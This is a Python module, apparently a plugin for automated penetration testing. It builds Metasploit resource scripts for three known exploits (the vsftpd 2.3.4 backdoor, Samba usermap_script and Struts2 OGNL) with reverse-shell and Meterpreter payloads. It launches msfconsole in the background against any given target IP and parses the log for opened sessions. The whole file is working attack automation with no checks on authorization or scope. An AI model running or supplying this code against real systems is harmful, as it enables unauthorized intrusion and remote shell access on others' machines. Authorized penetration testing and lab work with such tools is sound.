import os
import time
import subprocess
from pathlib import Path

EXPLOIT_LIBRARY = {
    "ftp_vsftpd": {
        "module": "exploit/unix/ftp/vsftpd_234_backdoor",
        "payload": "cmd/unix/interact",
        "default_port": 21
    },
    "samba_usermap": {
        "module": "exploit/linux/samba/usermap_script",
        "payload": "cmd/unix/reverse",
        "default_port": 139
    },
    "apache_struts": {
        "module": "exploit/multi/http/struts2_content_type_ognl",
        "payload": "java/meterpreter/reverse_tcp",
        "default_port": 8080
    }
}

def run_msf_attack(
    target_ip: str,
    exploit_name: str = "ftp_vsftpd",
    lhost: str = "10.0.0.100",
    lport: str = "4444",
    log_dir: str = "logs/metasploit"
) -> dict:
    """
    Launches Metasploit against a target IP using a known exploit.

    Args:
        target_ip (str): The target IP to attack.
        exploit_name (str): The key from EXPLOIT_LIBRARY to use.
        lhost (str): The local host for reverse payloads.
        lport (str): The port for callback listeners.
        log_dir (str): Where to write the RC script and log.

    Returns:
        dict: Dictionary with:
            - script: path to .rc file
            - log: path to msf log output
            - exploit: exploit name used
            - timestamp: run start time
            - error (optional): if the attack failed to launch
    """
    Path(log_dir).mkdir(parents=True, exist_ok=True)
    timestamp = int(time.time())
    script_path = os.path.join(log_dir, f"attack_{timestamp}.rc")
    log_path = os.path.join(log_dir, f"msf_{timestamp}.log")

    if exploit_name not in EXPLOIT_LIBRARY:
        return {
            "error": f"Invalid exploit: {exploit_name}",
            "exploit": exploit_name,
            "script": None,
            "log": None,
            "timestamp": timestamp
        }

    module = EXPLOIT_LIBRARY[exploit_name]

    try:
        with open(script_path, "w") as f:
            f.write(f"use {module['module']}\n")
            f.write(f"set RHOST {target_ip}\n")
            f.write(f"set LHOST {lhost}\n")
            f.write(f"set LPORT {lport}\n")
            f.write(f"set PAYLOAD {module['payload']}\n")
            f.write("exploit -j\n")
    except Exception as e:
        return {
            "error": f"Failed to write RC script: {e}",
            "exploit": exploit_name,
            "script": script_path,
            "log": None,
            "timestamp": timestamp
        }

    try:
        subprocess.Popen(
            ["nohup", "msfconsole", "-r", script_path],
            stdout=open(log_path, "w"),
            stderr=subprocess.STDOUT,
            preexec_fn=os.setpgrp
        )
        print(f"[metasploit_plugin] Launched '{exploit_name}' against {target_ip} → {log_path}")

        return {
            "script": script_path,
            "log": log_path,
            "exploit": exploit_name,
            "timestamp": timestamp
        }

    except Exception as e:
        return {
            "error": f"Failed to launch Metasploit: {e}",
            "script": script_path,
            "log": log_path,
            "exploit": exploit_name,
            "timestamp": timestamp
        }

def parse_msf_log(log_path: str) -> dict:
    """
    Parses a Metasploit log file to check for successful sessions or errors.

    Args:
        log_path (str): Path to the log file created by Metasploit.

    Returns:
        dict: Summary including:
            - session_opened (bool)
            - errors (list of str)
            - log_path (str)
    """
    outcome = {"session_opened": False, "errors": [], "log_path": log_path}

    try:
        with open(log_path) as f:
            lines = f.readlines()

        for line in lines:
            if "Meterpreter session" in line or "Command shell session" in line:
                outcome["session_opened"] = True
            if "[error]" in line.lower() or "failed" in line.lower():
                outcome["errors"].append(line.strip())

    except Exception as e:
        outcome["errors"].append(f"Log parsing failed: {e}")

    return outcome
